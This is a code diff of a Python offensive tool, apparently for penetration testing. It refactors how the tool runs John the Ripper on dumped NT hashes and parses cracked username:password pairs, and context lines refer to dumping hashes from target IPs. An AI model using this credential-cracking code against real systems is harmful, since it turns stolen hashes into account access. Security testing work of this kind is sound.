@@ -150,7 +150,7 @@ class ExploitTool(cmd.Cmd):
                     print(f"[!] Error: {hash_file} not found.")
                 else:
                     self.logger.info("[*] Starting John the Ripper to crack NT hashes with 2-minute timeout...")
-                    print("[*] Cracking hashes with John the Ripper (2-minute timeout)...")
+                    print("[*] Cracking hashes (timeout after 2 minutes)...")
                     try:
                         # Start John process
                         process = subprocess.Popen(
@@ -163,46 +163,46 @@ class ExploitTool(cmd.Cmd):
                         # Wait for 2 minutes (120 seconds) or until process completes
                         try:
                             stdout, stderr = process.communicate(timeout=120)
-                            # Extract passwords from John's output
-                            cracked_passwords = self.extract_passwords(stdout)
-                            if cracked_passwords:
-                                print("[*] Cracked Passwords:")
-                                for user, pwd in cracked_passwords.items():
-                                    print(f"{user}: {pwd}")
+                            # Parse and display only cracked passwords
+                            cracked = []
+                            for line in stdout.split("\n"):
+                                if "(" in line and ")" in line and len(line.split()) >= 1:
+                                    password = line.split()[0].strip()
+                                    username = line[line.find("(")+1:line.find(")")]
+                                    cracked.append(f"{username}: {password}")
+                            if cracked:
+                                print("[*] Cracked passwords:")
+                                for entry in cracked:
+                                    print(entry)
                             else:
-                                print("[*] No passwords cracked within 2 minutes.")
+                                print("[*] No passwords cracked.")
                         except subprocess.TimeoutExpired:
                             self.logger.warning("[!] John took longer than 2 minutes. Terminating and showing partial results...")
-                            print("[!] Hash cracking timed out after 2 minutes.")
+                            print("[!] Timeout after 2 minutes. Showing cracked passwords so far...")
                             process.kill()  # Terminate the process
                             stdout, stderr = process.communicate()  # Get any output up to this point
-                            # Extract passwords from partial output
-                            cracked_passwords = self.extract_passwords(stdout)
-                            if cracked_passwords:
-                                print("[*] Cracked Passwords:")
-                                for user, pwd in cracked_passwords.items():
-                                    print(f"{user}: {pwd}")
+                            # Parse partial output for cracked passwords
+                            cracked = []
+                            for line in stdout.split("\n"):
+                                if "(" in line and ")" in line and len(line.split()) >= 1:
+                                    password = line.split()[0].strip()
+                                    username = line[line.find("(")+1:line.find(")")]
+                                    cracked.append(f"{username}: {password}")
+                            if cracked:
+                                print("[*] Cracked passwords so far:")
+                                for entry in cracked:
+                                    print(entry)
                             else:
                                 print("[*] No passwords cracked within 2 minutes.")
-                            # Optionally show remaining hashes
-                            show_result = subprocess.run(
-                                ["john", "--show", hash_file],
-                                capture_output=True,
-                                text=True
-                            )
-                            if "0 password hashes cracked" in show_result.stdout:
-                                self.logger.info("[*] No additional passwords cracked.")
-                            else:
-                                self.logger.info("[*] Additional passwords may have been cracked; check manually with 'john --show clean_hashes.txt'.")
                         except Exception as e:
                             self.logger.error(f"[!] Error during John execution: {str(e)}")
-                            print(f"[!] Error during John execution: {str(e)}")
+                            print(f"[!] Error: {str(e)}")
                     except FileNotFoundError:
                         self.logger.error("[!] Error: John the Ripper not found. Please ensure it's installed and in your PATH.")
-                        print("[!] Error: John the Ripper not found. Please ensure it's installed and in your PATH.")
+                        print("[!] Error: John the Ripper not found.")
                     except Exception as e:
                         self.logger.error(f"[!] Error running John: {str(e)}")
-                        print(f"[!] Error running John: {str(e)}")
+                        print(f"[!] Error: {str(e)}")
             else:
                 self.logger.info("[*] Continuing without cracking hashes.")
                 print("[*] Continuing without cracking hashes.")
@@ -210,19 +210,6 @@ class ExploitTool(cmd.Cmd):
         except Exception as e:
             self.logger.error(f"[!] An error occurred: {str(e)}")
             return
-
-    def extract_passwords(self, output):
-        """Extract usernames and passwords from John's output."""
-        passwords = {}
-        lines = output.split("\n")
-        for line in lines:
-            # Match lines with password and username, e.g., "P@ssw0rd         (Administrator)"
-            match = re.search(r'^\s*(\S+)\s+\((\S+)\)$', line.strip())
-            if match:
-                password = match.group(1)
-                username = match.group(2)
-                passwords[username] = password
-        return passwords
 
     def do_dump_hashes(self, dir_path):
         """Dump extracted hashes into a file in the provided directory"""
@@ -400,7 +387,7 @@ class ExploitTool(cmd.Cmd):
             if not hashes_found:
                 self.logger.warning(f"[!] No hashes found for {target_ip} in script output")
             else:
-                self.logger.info(f"[*] Hashes also saved to ~/hashes")
+                self.logger.info(f"[*] Hashes also saved to hashes")
 
             # Extract session ID
             session_id = None
